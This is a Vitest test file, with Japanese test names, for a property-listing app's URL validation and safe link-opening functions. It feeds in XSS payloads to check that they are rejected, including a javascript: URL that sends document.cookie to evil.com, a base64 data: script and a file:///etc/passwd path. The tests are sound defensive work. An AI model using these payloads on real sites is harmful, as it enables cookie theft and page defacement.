import { describe, test, expect, vi, beforeEach, afterEach } from 'vitest';
import { validatePropertyUrl, sanitizeUrl, openUrlSafely } from '../validation';

describe('validation - SEC-011 URL入力でのスクリプト実行対策', () => {
  describe('validatePropertyUrl', () => {
    test('正常なHTTP/HTTPSのURLを受け入れる', () => {
      expect(validatePropertyUrl('https://www.suumo.jp/property/12345')).toBeNull();
      expect(validatePropertyUrl('http://example.com/page')).toBeNull();
      expect(validatePropertyUrl('https://example.co.jp:8080/path')).toBeNull();
      expect(validatePropertyUrl('https://example.com/path?query=value#fragment')).toBeNull();
    });

    test('空の入力を許可する', () => {
      expect(validatePropertyUrl('')).toBeNull();
      expect(validatePropertyUrl(null as any)).toBeNull();
      expect(validatePropertyUrl(undefined as any)).toBeNull();
    });

    test('javascript:プロトコルを拒否する', () => {
      const result = validatePropertyUrl('javascript:alert("XSS")');
      expect(result).toBe('安全でないURLです。http://またはhttps://で始まるURLを入力してください');
    });

    test('data:プロトコルを拒否する', () => {
      const result = validatePropertyUrl('data:text/html,<script>alert("XSS")</script>');
      expect(result).toBe('安全でないURLです。http://またはhttps://で始まるURLを入力してください');
    });

    test('vbscript:プロトコルを拒否する', () => {
      const result = validatePropertyUrl('vbscript:msgbox("XSS")');
      expect(result).toBe('安全でないURLです。http://またはhttps://で始まるURLを入力してください');
    });

    test('file:プロトコルを拒否する', () => {
      const result = validatePropertyUrl('file:///etc/passwd');
      expect(result).toBe('安全でないURLです。http://またはhttps://で始まるURLを入力してください');
    });

    test('その他の不審なプロトコルを拒否する', () => {
      expect(validatePropertyUrl('ftp://example.com')).toBe('URLはhttp://またはhttps://で始まる必要があります');
      expect(validatePropertyUrl('mailto:test@example.com')).toBe('URLはhttp://またはhttps://で始まる必要があります');
      expect(validatePropertyUrl('tel:+81-3-1234-5678')).toBe('URLはhttp://またはhttps://で始まる必要があります');
    });

    test('不正な形式のURLを拒否する', () => {
      expect(validatePropertyUrl('not-a-url')).toBe('URLの形式が正しくありません');
      expect(validatePropertyUrl('http://')).toBe('URLの形式が正しくありません');
      expect(validatePropertyUrl('https://')).toBe('URLの形式が正しくありません');
      expect(validatePropertyUrl('//example.com')).toBe('URLの形式が正しくありません');
    });

    test('大文字小文字を区別しない', () => {
      expect(validatePropertyUrl('JAVASCRIPT:alert("XSS")')).toBe('安全でないURLです。http://またはhttps://で始まるURLを入力してください');
      expect(validatePropertyUrl('JavaScript:alert("XSS")')).toBe('安全でないURLです。http://またはhttps://で始まるURLを入力してください');
      expect(validatePropertyUrl('DATA:text/html,<script>alert("XSS")</script>')).toBe('安全でないURLです。http://またはhttps://で始まるURLを入力してください');
    });
  });

  describe('sanitizeUrl', () => {
    test('正常なHTTP/HTTPSのURLをそのまま返す', () => {
      expect(sanitizeUrl('https://www.suumo.jp/property/12345')).toBe('https://www.suumo.jp/property/12345');
      expect(sanitizeUrl('http://example.com/page')).toBe('http://example.com/page');
    });

    test('空の入力にnullを返す', () => {
      expect(sanitizeUrl('')).toBeNull();
      expect(sanitizeUrl(null as any)).toBeNull();
      expect(sanitizeUrl(undefined as any)).toBeNull();
    });

    test('危険なプロトコルのURLにnullを返す', () => {
      expect(sanitizeUrl('javascript:alert("XSS")')).toBeNull();
      expect(sanitizeUrl('data:text/html,<script>alert("XSS")</script>')).toBeNull();
      expect(sanitizeUrl('vbscript:msgbox("XSS")')).toBeNull();
      expect(sanitizeUrl('file:///etc/passwd')).toBeNull();
    });

    test('URLを正規化する', () => {
      // URLクラスによる自動正規化
      expect(sanitizeUrl('https://example.com//../path')).toBe('https://example.com/path');
      expect(sanitizeUrl('https://example.com/path?')).toBe('https://example.com/path?');
    });
  });

  describe('openUrlSafely', () => {
    let mockOpen: any;
    let mockConsoleError: any;

    beforeEach(() => {
      mockOpen = vi.fn(() => ({ opener: {} }));
      mockConsoleError = vi.fn();
      window.open = mockOpen;
      console.error = mockConsoleError;
    });

    afterEach(() => {
      vi.restoreAllMocks();
    });

    test('安全なURLを新しいタブで開く', () => {
      openUrlSafely('https://example.com');
      
      expect(mockOpen).toHaveBeenCalledWith(
        'https://example.com/',
        '_blank',
        'noopener,noreferrer'
      );
      expect(mockConsoleError).not.toHaveBeenCalled();
    });

    test('openerをnullに設定する', () => {
      const mockWindow = { opener: {} };
      mockOpen.mockReturnValue(mockWindow);
      
      openUrlSafely('https://example.com');
      
      expect(mockWindow.opener).toBeNull();
    });

    test('危険なURLを開かない', () => {
      openUrlSafely('javascript:alert("XSS")');
      
      expect(mockOpen).not.toHaveBeenCalled();
      expect(mockConsoleError).toHaveBeenCalledWith('無効なURLです:', 'javascript:alert("XSS")');
    });

    test('同じタブで開く場合はlocation.hrefを使用', () => {
      const originalHref = window.location.href;
      Object.defineProperty(window, 'location', {
        value: { href: originalHref },
        writable: true
      });
      
      openUrlSafely('https://example.com', '_self');
      
      expect(window.location.href).toBe('https://example.com/');
      expect(mockOpen).not.toHaveBeenCalled();
      
      // 元に戻す
      window.location.href = originalHref;
    });

    test('空のURLを処理する', () => {
      openUrlSafely('');
      
      expect(mockOpen).not.toHaveBeenCalled();
      expect(mockConsoleError).toHaveBeenCalledWith('無効なURLです:', '');
    });
  });

  describe('実際の攻撃シナリオ', () => {
    test('XSS攻撃の試みを防ぐ', () => {
      const attacks = [
        'javascript:document.cookie="stolen"',
        'javascript:fetch("https://evil.com/steal",{method:"POST",body:document.cookie})',
        'javascript:void(document.body.innerHTML="<h1>Hacked!</h1>")',
        'JAVASCRIPT:alert(document.domain)',
        'jAvAsCrIpT:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='
      ];

      attacks.forEach(attack => {
        const validationResult = validatePropertyUrl(attack);
        expect(validationResult).not.toBeNull();
        expect(validationResult).toContain('安全でないURL');
        
        const sanitized = sanitizeUrl(attack);
        expect(sanitized).toBeNull();
      });
    });

    test('正当な不動産サイトのURLを受け入れる', () => {
      const legitUrls = [
        'https://suumo.jp/jj/bukken/shosai/JJ010FJ001/?ar=030&bs=011&nc=12345678',
        'https://www.homes.co.jp/archive/b-12345678/',
        'https://www.athome.co.jp/kodate/1234567890/',
        'https://realestate.yahoo.co.jp/rent/detail/0000000000/',
        'http://www.realtor.com/realestateandhomes-detail/123-Main-St_City_ST_12345/12345678'
      ];

      legitUrls.forEach(url => {
        expect(validatePropertyUrl(url)).toBeNull();
        expect(sanitizeUrl(url)).toBe(url);
      });
    });
  });
});